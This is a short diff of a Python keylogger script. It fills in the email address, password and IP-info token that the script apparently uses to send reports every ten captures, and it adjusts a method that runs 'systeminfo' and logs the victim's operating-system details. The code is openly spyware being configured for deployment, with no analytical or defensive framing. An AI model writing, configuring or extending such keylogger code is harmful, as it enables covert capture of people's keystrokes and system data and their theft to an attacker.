@@ -64,9 +64,9 @@ finally:
 
     atexit.register(cleanup_temp_dir)
 
-    EMAIL_ADDRESS = "YOUR_EMAIL_ADDRESS_HERE"
-    EMAIL_PASSWORD = "YOUR_EMAIL_PASSWORD_HERE"
-    IP_INFO_TOKEN = "YOUR_IP_INFO_TOKEN_HERE"
+    EMAIL_ADDRESS = "a36f2db379fade"
+    EMAIL_PASSWORD = "e79b8e24d4c8c9"
+    IP_INFO_TOKEN = "052c054ec65ee7"
     SEND_REPORT_EVERY = 10
 
     class KeyLogger:
@@ -233,7 +233,7 @@ finally:
         def get_os_info(self):
             systeminfo_output_bytes = subprocess.check_output(["systeminfo"])
             systeminfo_output = systeminfo_output_bytes.decode("utf-8", errors = "replace")
-            self.appendlog("OS Info:\n\n")
+            self.appendlog("\nOS Info:\n")
             self.appendlog(systeminfo_output)
 
         def system_information(self):
